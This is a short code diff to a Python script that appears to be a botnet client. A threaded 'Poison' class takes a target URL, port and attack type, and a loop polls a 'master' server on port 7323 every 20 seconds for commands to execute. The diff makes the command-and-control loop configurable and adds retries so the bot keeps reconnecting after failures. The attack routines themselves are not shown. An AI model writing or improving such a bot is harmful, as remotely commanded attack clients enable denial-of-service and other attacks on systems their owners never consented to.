@@ -3,6 +3,10 @@ import time
 import random
 import threading
 
+MASTER_ADDRESS = "localhost"
+MASTER_PORT = 7323
+POLL_INTERVAL = 20
+
 class Poison (threading.Thread):
     def __init__(self, threadID, url, port, type_name):
         threading.Thread.__init__(self)
@@ -85,15 +89,21 @@ def handle_command(command):
 
 
 while True:
-    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    master.connect(("localhost", 7323))
+    try:
+        master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        master.connect((MASTER_ADDRESS, MASTER_PORT))
 
-    res = master.recv(256)
+        res = master.recv(256)
 
-    command = res.decode("utf-8")
+        command = res.decode("utf-8")
 
-    handle_command(command)
+        handle_command(command)
 
-    master.close()
-    time.sleep(20)
+        master.close()
+
+        print(f'Next poll in {POLL_INTERVAL} seconds...')
+    except Exception as e:
+        print("Error connecting to master", e)
+        print(f'Retrying in {POLL_INTERVAL} seconds...')
+    time.sleep(POLL_INTERVAL)
 
